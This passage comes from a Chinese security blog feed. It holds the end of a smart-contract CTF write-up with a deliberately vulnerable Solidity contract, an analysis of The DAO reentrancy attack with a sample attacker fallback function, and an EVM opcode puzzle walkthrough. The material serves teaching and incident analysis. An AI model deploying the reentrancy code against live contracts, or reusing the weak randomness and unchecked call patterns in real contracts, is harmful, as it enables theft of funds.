x;</span><br><span class="line">        assembly &#123; x := extcodesize(caller) &#125;</span><br><span class="line">        require(x == 0);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function _transfer(address _from, address _to, uint _value) internal &#123;</span><br><span class="line">        require(_to != address(0x0));</span><br><span class="line">        require(_value &gt; 0);</span><br><span class="line">        </span><br><span class="line">        uint256 oldFromBalance = balanceOf[_from];</span><br><span class="line">        uint256 oldToBalance = balanceOf[_to];</span><br><span class="line">        </span><br><span class="line">        uint256 newFromBalance =  balanceOf[_from] - _value;</span><br><span class="line">        uint256 newToBalance =  balanceOf[_to] + _value;</span><br><span class="line">        </span><br><span class="line">        require(oldFromBalance &gt;= _value);</span><br><span class="line">        require(newToBalance &gt; oldToBalance);</span><br><span class="line">        </span><br><span class="line">        balanceOf[_from] = newFromBalance;</span><br><span class="line">        balanceOf[_to] = newToBalance;</span><br><span class="line">        </span><br><span class="line">        assert((oldFromBalance + oldToBalance) == (newFromBalance + newToBalance));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function transfer(address _to, uint256 _value) public returns (bool success) &#123;</span><br><span class="line">        _transfer(msg.sender, _to, _value); </span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function Deposit() public payable &#123;</span><br><span class="line">        if(msg.value &gt;= 500 ether)&#123;</span><br><span class="line">            mycart[msg.sender] += 1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function gift() first &#123;</span><br><span class="line">        require(mycart[msg.sender] == 0);</span><br><span class="line">        require(uint(msg.sender) &amp; 0xfff == 0x111);</span><br><span class="line">        balanceOf[msg.sender] = 100;</span><br><span class="line">        mycart[msg.sender] += 1;</span><br><span class="line">        level[msg.sender] += 1;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    function Chopping(uint _hand) public &#123;</span><br><span class="line">        Tmall tmall = Tmall(msg.sender);</span><br><span class="line">        </span><br><span class="line">        if (!tmall.Chop_hand(_hand)) &#123;</span><br><span class="line">            hand = _hand;</span><br><span class="line">            have_chopped = tmall.Chop_hand(hand);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    function guess(uint num) public &#123;</span><br><span class="line">        uint seed = uint(blockhash(block.number - 1));</span><br><span class="line">        uint rand = seed % 3;</span><br><span class="line">        if (rand == num) &#123;</span><br><span class="line">            have_money = true;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function buy() public &#123;</span><br><span class="line">        require(level[msg.sender] == 1);</span><br><span class="line">        require(mycart[msg.sender] == 1);</span><br><span class="line">        require(have_chopped == true);</span><br><span class="line">        require(have_money == true);</span><br><span class="line">        mycart[msg.sender] += 1;</span><br><span class="line">        level[msg.sender] += 1;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    function retract() public &#123;</span><br><span class="line">        require(codex.length == 0);</span><br><span class="line">        require(mycart[msg.sender] == 2);</span><br><span class="line">        require(level[msg.sender] == 2);</span><br><span class="line">        require(have_money == true);</span><br><span class="line">        codex.length -= 1;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function revise(uint i, bytes32 _person) public &#123;</span><br><span class="line">        require(codex.length &gt;= 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffff00000);</span><br><span class="line">        require(mycart[msg.sender] == 2);</span><br><span class="line">        require(level[msg.sender] == 2);</span><br><span class="line">        require(have_money == true);</span><br><span class="line">        codex[i] = _person;</span><br><span class="line">        if (codex.length &lt; 0xffffffffff000000000000000000000000000000000000000000000000000000)&#123;</span><br><span class="line">            codex.length = 0;</span><br><span class="line">            revert();</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            level[msg.sender] += 1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function withdraw(uint _amount) onlyOwner public &#123;</span><br><span class="line">        require(mycart[msg.sender] == 2);</span><br><span class="line">        require(level[msg.sender] == 3);</span><br><span class="line">        require(_amount &gt;= 100);</span><br><span class="line">        require(balanceOf[msg.sender] &gt;= _amount);</span><br><span class="line">        require(address(this).balance &gt;= _amount);</span><br><span class="line">        balanceOf[msg.sender] -= _amount;</span><br><span class="line">        msg.sender.call.value(_amount)();</span><br><span class="line">        mycart[msg.sender] -= 1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>payforlag</code>函数中是获取flag的条件，要求<code>msg.sender</code>的低位为<code>0x111</code>，<code>lelve[msgs.sender] == 3</code>，且账户的余额大于 10000000000000000000。</p><p><code>Deposit</code>函数</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;integer-overflow&quot;&gt;&lt;a href=&quot;#integer-overflow&quot; class=&quot;headerlink&quot; title=&quot;integer overflow&quot;&gt;&lt;/a&gt;integer overflow&lt;/h3&gt;&lt;h4 id=&quot;bet&quot;&gt;&lt;a h</summary>
      
    
    
    
    
    <category term="智能合约 CTF" scheme="https://banana69.site/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-CTF/"/>
    
  </entry>
  
  <entry>
    <title>The Dao 事件分析</title>
    <link href="https://banana69.site/2022/07/29/RaceToEmpty%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/"/>
    <id>https://banana69.site/2022/07/29/RaceToEmpty%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/</id>
    <published>2022-07-29T08:55:14.000Z</published>
    <updated>2022-07-29T10:30:55.208Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Race-To-Empty-攻击简介"><a href="#Race-To-Empty-攻击简介" class="headerlink" title="Race To Empty 攻击简介"></a>Race To Empty 攻击简介</h3><p>Race To Empty 就是使用多次且快速调用代码的方式使被攻击者账户中的资产为空的一种攻击方式，利用 <code>fallback()</code>函数使受害者递归调用转账函数，也就是我们现在说的重入攻击 </p><p>举个例子来理解：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function withdrawBalance() &#123;  </span><br><span class="line">  amountToWithdraw = userBalances[msg.sender];</span><br><span class="line">  if (!(msg.sender.call.value(amountToWithdraw)())) &#123; </span><br><span class="line">  throw;</span><br><span class="line">  &#125;</span><br><span class="line">  userBalances[msg.sender] = 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面是一个普通的取款函数，在被调用时会执行以下操作</p><ol><li>获取记录的余额<code>userBalances[msg.sender]</code></li><li>将获取到的余额发送，若发送不成功则抛出异常</li><li>将 <code>msg.sender</code>的余额置为 0</li></ol><p>以上操作看起来没有任何问题，实际上在智能合约上执行时，转账接收者在合约中可以写一段恶意代码，比如像这样的代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function () &#123;  </span><br><span class="line">  // To be called by a vulnerable contract with a withdraw function.</span><br><span class="line">  // This will double withdraw.</span><br><span class="line"></span><br><span class="line">  vulnerableContract v;</span><br><span class="line">  uint times;</span><br><span class="line">  if (times == 0 &amp;&amp; attackModeIsOn) &#123;</span><br><span class="line">    times = 1;</span><br><span class="line">    v.withdrawBalance();</span><br><span class="line"></span><br><span class="line">   &#125; else &#123; times = 0; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在每次调用<code>msg.sender.call.value()</code>就会调用默认函数，而默认函数又会去调用 <code>withdrawBalance()</code>，这样就会造成递归调用，函数调用栈如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vulnerableContract.withdrawBalance run 1</span><br><span class="line">attacker default function run 1</span><br><span class="line">vulnerableContract.withdrawBalance run 2</span><br><span class="line">attacker default function run 2</span><br></pre></td></tr></table></figure><p>当第一次调用<code>userBalances[msg.sender]</code>会正常执行下面的转账操作，当第二次调用时还为执行置 0 操作，就会不断的向攻击者转账，耗尽被攻击者的余额。</p><h3 id="The-Dao-事件中的重入攻击"><a href="#The-Dao-事件中的重入攻击" class="headerlink" title="The Dao 事件中的重入攻击"></a>The Dao 事件中的重入攻击</h3><h5 id="fallback函数"><a href="#fallback函数" class="headerlink" title="fallback函数"></a>fallback函数</h5><p>fallback 函数又被称为回退函数，每个合约具有一个没有名字的函数，当合约被调用时，如果无法匹配到有效的函数，就会默认调用 <code>fallback</code>函数；当合约接收到 ether 时 ，会退函数也会被执行。</p><h5 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h5><p>DAO被攻击成功主要有俩个原因：</p><ol><li>DAO余额扣除与转账顺序有误，应该先进行扣除费用再进行转账；</li><li>未知代码被无限制使用。</li></ol><p>攻击者在自己的合约中，利用 fallback 函数通过递归初查 DAO 的splitDAO 函数的多次调用。</p><p>源码分析：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// Modifier that allows only shareholders to vote and create new proposals</span><br><span class="line">    modifier onlyTokenholders &#123;</span><br><span class="line">        if (balanceOf(msg.sender) == 0) throw;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>上面的代码对 <code>msg.sender</code>持有的 dao token 进行判断，当余额为 0 时会抛出异常。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// Move ether and assign new Tokens</span><br><span class="line">uint fundsToBeMoved =(balances[msg.sender] * p.splitData[0].splitBalance) / p.splitData[0].totalSupply;</span><br><span class="line">if (p.splitData[0].newDAO.createTokenProxy.value(fundsToBeMoved)(msg.sender) == false)</span><br><span class="line">throw;</span><br></pre></td></tr></table></figure><p>在 DAO.sol 中的 splitDao可以找到向 childDAo 转账的代码，它会将代币从 the parent DAO 转移到 the child DAO中。攻击者就是利用这条语句来获取更多的代币并转移到 child DAO 中。</p><p><strong>fundsToBeMoved</strong> 的作用是决定了要转移的代币的数量，因为攻击者每次调用时 <code>p.splitData[0]</code>都是一样的，并且<code>p.splitData[0].totalSupply</code>与<code>balances[msg.sender]</code>的值由于函数顺序问题没有被更新。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// Burn DAO Tokens</span><br><span class="line">Transfer(msg.sender, 0, balances[msg.sender]);</span><br><span class="line">withdrawRewardFor(msg.sender); // be nice, and get his rewards</span><br><span class="line">totalSupply -= balances[msg.sender];</span><br><span class="line">balances[msg.sender] = 0;</span><br><span class="line">paidOut[msg.sender] = 0;</span><br><span class="line">return true;</span><br></pre></td></tr></table></figure><p>所以要想实现不断的转账操作，就必须依靠其他方法，根据上面的代码，为msg.sender记录的dao币余额归零、扣减 dao token 总量totalSupply等等都发生在将token转入msg.sender之后。下面看<code>withdrawRewardFor)()</code>函数。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function withdrawRewardFor(address _account) noEther internal returns (bool _success) &#123;</span><br><span class="line">if ((balanceOf(_account) * rewardAccount.accumulatedInput()) / totalSupply &lt; paidOut[_account])</span><br><span class="line">throw;</span><br><span class="line">uint reward =(balanceOf(_account) * rewardAccount.accumulatedInput()) / totalSupply - paidOut[_account];</span><br><span class="line">if (!rewardAccount.payOut(_account, reward))</span><br><span class="line">throw;</span><br><span class="line">  paidOut[_account] += reward;</span><br><span class="line">  return true;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>paidOut[_account] += reward</code>在问题代码里面放在payOut函数调用之后，再看payOut函数调用。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function payOut(address _recipient, uint _amount) returns (bool) &#123;</span><br><span class="line">        if (msg.sender != owner || msg.value &gt; 0 || (payOwnerOnly &amp;&amp; _recipient != owner))</span><br><span class="line">            throw;</span><br><span class="line"></span><br><span class="line">        if (_recipient.call.value(_amount)()) &#123;    //注意这一行</span><br><span class="line"></span><br><span class="line">            PayOut(_recipient, _amount);</span><br><span class="line">            return true;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>对_recipient发出call调用，转账_amount个Wei，call调用默认会使用当前剩余的所有gas。</p><p>以上就是 DAO 事件的代码分析。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;Race-To-Empty-攻击简介&quot;&gt;&lt;a href=&quot;#Race-To-Empty-攻击简介&quot; class=&quot;headerlink&quot; title=&quot;Race To Empty 攻击简介&quot;&gt;&lt;/a&gt;Race To Empty 攻击简介&lt;/h3&gt;&lt;p&gt;Race T</summary>
      
    
    
    
    <category term="区块链" scheme="https://banana69.site/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    
    <category term="智能合约" scheme="https://banana69.site/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"/>
    
  </entry>
  
  <entry>
    <title>Evm-puzzles题解</title>
    <link href="https://banana69.site/2022/07/28/evm-puzzles/"/>
    <id>https://banana69.site/2022/07/28/evm-puzzles/</id>
    <published>2022-07-27T16:00:00.000Z</published>
    <updated>2022-07-28T07:01:08.830Z</updated>
    
    <content type="html"><![CDATA[<p>Evm-puzzles 是一个以太坊操作码的挑战，每道题都会提供一些列操作码，并提示输入正确的交易值或者调用数据。通过Evm-puzzles可以了解EVM操作码的运行机制</p><p><img src="/image/evm-puzzles.assets/1.png" alt="1"></p><h3 id="Puzzle-1"><a href="#Puzzle-1" class="headerlink" title="Puzzle 1"></a>Puzzle 1</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">############</span></span><br><span class="line"><span class="comment"># Puzzle 1 #</span></span><br><span class="line"><span class="comment">############</span></span><br><span class="line"></span><br><span class="line">00      34      CALLVALUE</span><br><span class="line">01      56      JUMP</span><br><span class="line">02      FD      REVERT</span><br><span class="line">03      FD      REVERT</span><br><span class="line">04      FD      REVERT</span><br><span class="line">05      FD      REVERT</span><br><span class="line">06      FD      REVERT</span><br><span class="line">07      FD      REVERT</span><br><span class="line">08      5B      JUMPDEST</span><br><span class="line">09      00      STOP</span><br><span class="line"></span><br><span class="line">? Enter the value to send: (0)</span><br></pre></td></tr></table></figure><p>这道题提示需要输入一个发送的值，即向这个合约发送一笔交易，这个交易需要多少value才能不处罚 REVERT指令。</p><p>首先需要了解 CALLVALUE 指令，此操作会获取到负责此执行的指令/交易的值，并将该值推到堆栈的顶部，如果输入10，则在 CALLVALUE 指令执行后，堆栈中的结构如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[<span class="number">10</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>而 JUMP 的指令的作用是更改程序计数器，使栈顶的值 n 出栈，并跳转到第 n 条执行，JUMP 执行的跳转必须以 JUMPDEST 指令结束。</p><p>所以要想通过这道题，只需要输入 value 为8，CALLVALUE 指令将 8 压入栈顶，栈中结构如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[<span class="number">8</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>当执行到 JUMP 指令时栈顶的值为 8，然后跳转到第 8 条指令即 JUMPDEST，跳过所有 REVERT指令。</p><h3 id="Puzzle-2"><a href="#Puzzle-2" class="headerlink" title="Puzzle 2"></a>Puzzle 2</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">############</span></span><br><span class="line"><span class="comment"># Puzzle 2 #</span></span><br><span class="line"><span class="comment">############</span></span><br><span class="line"></span><br><span class="line">00      34      CALLVALUE</span><br><span class="line">01      38      CODESIZE</span><br><span class="line">02      03      SUB</span><br><span class="line">03      56      JUMP</span><br><span class="line">04      FD      REVERT</span><br><span class="line">05      FD      REVERT</span><br><span class="line">06      5B      JUMPDEST</span><br><span class="line">07      00      STOP</span><br><span class="line">08      FD      REVERT</span><br><span class="line">09      FD      REVERT</span><br></pre></td></tr></table></figure><p>这道题依然需要输入一个值，使程序在不执行 REVERT 指令的前提下运行。首先需要了解 CODESIZE 指令，此操作码获取在当前环境中运行的代码的大小。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Add some instructions to increase the code size</span></span><br><span class="line">PUSH29 <span class="number">0</span></span><br><span class="line">POP</span><br><span class="line">CODESIZE</span><br><span class="line"></span><br><span class="line"><span class="comment">//stack =&gt; 20</span></span><br></pre></td></tr></table></figure><p>puzzle2 中，可以通过查看序列有多少操作码来手动剪擦好代码的大小，每个操作码的大小是 1 byte，所以10个操作码的大小一共是 10 byte，而 EVM 中使用十六进制表示，即 0a 被压入栈顶。</p><p>SUB 指令是用栈顶元素的值减去栈中的第二个元素的值，然后将结果压入栈中，向上一题一样，如果需要跳过REVERT 指令，则需要跳转到第6条指令，由于在执行 CODESIZE 后栈顶元素的值为 0a（10） ，所以只需要使输入的值为4时，在执行 JUMP 前，栈顶元素的值为 6，即跳转到 JUMPDEST，完成该题目。</p><h3 id="Puzzle-3"><a href="#Puzzle-3" class="headerlink" title="Puzzle 3"></a>Puzzle 3</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">############</span></span><br><span class="line"><span class="comment"># Puzzle 3 #</span></span><br><span class="line"><span class="comment">############</span></span><br><span class="line"></span><br><span class="line">00      36      CALLDATASIZE</span><br><span class="line">01      56      JUMP</span><br><span class="line">02      FD      REVERT</span><br><span class="line">03      FD      REVERT</span><br><span class="line">04      5B      JUMPDEST</span><br><span class="line">05      00      STOP</span><br></pre></td></tr></table></figure><p>这道题目中的操作码与之前基本一致，但是需要我们输入的不是交易时的 <strong>value</strong>，而是 <strong>calldata</strong>，即附加到 message 中的字节码。<code>args</code>也叫<code>calldata</code>，Calldata是不可修改的非持久性数据位置，所有传递给函数的值都存储在这里。与栈不同的地方的是，如果要使用calldata里面的数据，必须手动指定偏移量和读取的字节数，Calldata是外部函数的参数(而不是返回参数)的默认位置。（关于 calldata 可以参考<a href="https://learnblockchain.cn/2019/10/05/evm-data%EF%BC%89">https://learnblockchain.cn/2019/10/05/evm-data）</a></p><p>CALLDATASIZE 指令获取调用数据的大小（以字节为单位），并将其压入到堆栈中。所以我们只需要输入 CALLDATASIZE 的值为 4个字节，一个字节是8位，在16进制中一个字节为2个16进制位，只需要输入<code>0x11111111</code>，CALLDATASIZE 就会返回 4 个字节，即可让接下来的 JUMP 指令跳转到 JUMPDEST，完成该题目。</p><h3 id="Puzzle-4"><a href="#Puzzle-4" class="headerlink" title="Puzzle 4"></a>Puzzle 4</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">############</span></span><br><span class="line"><span class="comment"># Puzzle 4 #</span></span><br><span class="line"><span class="comment">############</span></span><br><span class="line"></span><br><span class="line">00      34      CALLVALUE</span><br><span class="line">01      38      CODESIZE</span><br><span class="line">02      18      XOR</span><br><span class="line">03      56      JUMP</span><br><span class="line">04      FD      REVERT</span><br><span class="line">05      FD      REVERT</span><br><span class="line">06      FD      REVERT</span><br><span class="line">07      FD      REVERT</span><br><span class="line">08      FD      REVERT</span><br><span class="line">09      FD      REVERT</span><br><span class="line">0A      5B      JUMPDEST</span><br><span class="line">0B      00      STOP</span><br></pre></td></tr></table></figure><p>解决这道题需要了解 XOR 指令，该指令会将俩个数字的二进制形式按位进行异或，如 5 和 3 的异或表示为：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="number">5</span>:<span class="number">00000000000000000000000000000101</span></span><br><span class="line"><span class="number">3</span>:<span class="number">00000000000000000000000000000011</span></span><br><span class="line"></span><br><span class="line"><span class="number">5</span> xor <span class="number">3</span>:<span class="number">00000000000000000000000000000110</span></span><br></pre></td></tr></table></figure><p>分析题目需要跳转到 JUMPDEST 指令，即第 10 条指令，意味着在执行 XOR 后栈顶的元素为 10(0A),，而 CODESIZE 执行后栈中的结构为：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[0c your_input <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>所以当 0c 和 输入的值进行异或后得到的值为 0a，所以需要输入的值为 0a xor 0c == 6，即可完成该题目。</p><h3 id="Puzzle-5"><a href="#Puzzle-5" class="headerlink" title="Puzzle 5"></a>Puzzle 5</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">############</span></span><br><span class="line"><span class="comment"># Puzzle 5 #</span></span><br><span class="line"><span class="comment">############</span></span><br><span class="line"></span><br><span class="line">00      34          CALLVALUE</span><br><span class="line">01      80          DUP1</span><br><span class="line">02      02          MUL</span><br><span class="line">03      610100      PUSH2 0100</span><br><span class="line">06      14          EQ</span><br><span class="line">07      600C        PUSH1 0C</span><br><span class="line">09      57          JUMPI</span><br><span class="line">0A      FD          REVERT</span><br><span class="line">0B      FD          REVERT</span><br><span class="line">0C      5B          JUMPDEST</span><br><span class="line">0D      00          STOP</span><br><span class="line">0E      FD          REVERT</span><br><span class="line">0F      FD          REVERT</span><br></pre></td></tr></table></figure><p>首先需要学习几个新的指令，<strong>DUP</strong> 指令表示复制栈顶上第一个位置的值，并将其压入栈顶，同样，dup2表示将栈中第二个位置的值复制并压入栈顶。dup指令包括dup1-dup16；<strong>MUL</strong>指令表示获取栈中的前俩个值，将他们相乘的结果压入栈顶；<strong>EQ</strong>指令表示获取栈中前俩个位置的值并比较运行结果，当运行结果相同时返回1，否则返回0，并将返回的结果压入栈顶。</p><p>在执行 DUP1 后栈中的结构为：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[your_input your_input <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>然后执行 MUL 操作，将前俩个值相乘，并将结果压入栈顶</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[mul_result <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>此时执行 PUSH2 0100，将2个字节的十六进制数0100（256）压入栈顶</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[<span class="number">0100</span> mul_result <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>然后执行 EQ 操作，判断堆栈上的前俩个值，比较其值是否相同，假设相等，将 1压入栈顶</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[<span class="number">1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>然后执行  PUSH1 0，它将 <code>0c</code> 压入栈顶，JUMPI 表示有条件的跳转，它有俩个参数，第一个参数表示跳转的位置，第二个参数表示是否跳转，此时栈中的结构如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[0c <span class="number">1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>当栈中的第二个元素的值为 1 时，发生跳转，跳转到位置 0c，正好是 JUMPDEST，完成该题目。所以往上推输入的值应该是16，使 ${input}^2=256$，然后通过 EQ 判断，执行 JUMPI。</p><h3 id="Puzzle-6"><a href="#Puzzle-6" class="headerlink" title="Puzzle 6"></a>Puzzle 6</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">############</span></span><br><span class="line"><span class="comment"># Puzzle 6 #</span></span><br><span class="line"><span class="comment">############</span></span><br><span class="line"></span><br><span class="line">00      6000      PUSH1 00</span><br><span class="line">02      35        CALLDATALOAD</span><br><span class="line">03      56        JUMP</span><br><span class="line">04      FD        REVERT</span><br><span class="line">05      FD        REVERT</span><br><span class="line">06      FD        REVERT</span><br><span class="line">07      FD        REVERT</span><br><span class="line">08      FD        REVERT</span><br><span class="line">09      FD        REVERT</span><br><span class="line">0A      5B        JUMPDEST</span><br><span class="line">0B      00        STOP</span><br></pre></td></tr></table></figure><p>这道题遇到了新的指令<code>CALLDATALOAD</code>，该指令需要一个参数 **CALLDATALOAD(p)**表示从附加在交易中的 <strong>calldata</strong> 中获取数据，即从位置 p 的开始获取调用数据。例如，当栈顶为 08 时，执行 <strong>CALLDATALOAD</strong> 表示，所有从 byte 8 到 byte 32 的 calldata会被压入栈顶，如果 calldata 是 64 字节并且需要访问序列的第二个 32 个字节，可以先压入<code>20</code>堆栈，然后使用<code>CALLDATALOAD</code>来获取序列的第二个 32 个字节。</p><p>所以这道题需要输入的 calldata 为 a，但是由于在发送 calldata 时，当 calldata 不满足32字节时会从左向右进行填充，所以 0a 就会变成 <code>a00000000000000000000000000000000000000000000000000000000000000</code>，所以可以向 0x0a 在左边填充 0 即：<code>0x000000000000000000000000000000000000000000000000000000000000000a</code>。</p><h3 id="Puzzle-7"><a href="#Puzzle-7" class="headerlink" title="Puzzle 7"></a>Puzzle 7</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">############</span></span><br><span class="line"><span class="comment"># Puzzle 7 #</span></span><br><span class="line"><span class="comment">############</span></span><br><span class="line"></span><br><span class="line">00      36        CALLDATASIZE</span><br><span class="line">01      6000      PUSH1 00</span><br><span class="line">03      80        DUP1</span><br><span class="line">04      37        CALLDATACOPY</span><br><span class="line">05      36        CALLDATASIZE</span><br><span class="line">06      6000      PUSH1 00</span><br><span class="line">08      6000      PUSH1 00</span><br><span class="line">0A      F0        CREATE</span><br><span class="line">0B      3B        EXTCODESIZE</span><br><span class="line">0C      6001      PUSH1 01</span><br><span class="line">0E      14        EQ</span><br><span class="line">0F      6013      PUSH1 13</span><br><span class="line">11      57        JUMPI</span><br><span class="line">12      FD        REVERT</span><br><span class="line">13      5B        JUMPDEST</span><br><span class="line">14      00        STOP</span><br></pre></td></tr></table></figure><p><code>CALLDATASIZE</code>需要输入特定大小的 calldata 来解决这个难题，calldata 的大小的值被压入栈后，继续执行<code>PUSH1 00</code>，<code>DUP1</code>，此时栈中的结构是：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[<span class="number">0</span> <span class="number">0</span> calldata_size <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>然后会执行 <strong>CALLDATACOPY</strong> 指令，该指令从交易中复制数据并将其保存在内存中，执行 <strong>CALLDATACOPY</strong> 需要三个参数，<code>[destOffset offset size]</code>，destOffset 表示要存储复制结果的偏移量，offset 表示要复制的调用数据中的字节偏移量，size表示复制的大小。</p><p>在执行 <strong>CALLDATACOPY</strong> 时，<code>destOffset</code>告诉程序内存中的哪个槽来存储从 calldata 复制的数据。<code>offset</code>表示从哪里开始复制调用数据（就像<code>CALLDATALOAD</code>在最后一个示例中确实如此）并且<code>size</code>告诉程序要在内存中存储多少字节序列。在这个过程中，栈顶的所有三个元素都被消耗掉了，所以在执行完 CALLDATACOPY 后栈中的结构是：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[<span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>当<code>CALLDATALOAD</code>指令执行时，它会将 calldata 存储在 memory slot<code>0</code>中，从 byte 开始<code>0</code>，并存储整个 calldata 的大小。</p><p>紧接着会执行<code>CALLDATASIZE</code> <code>PUSH1 00</code> <code>PUSH1 00</code>，执行完后栈中的结构为：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[<span class="number">0</span> <span class="number">0</span> calldata_size <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span 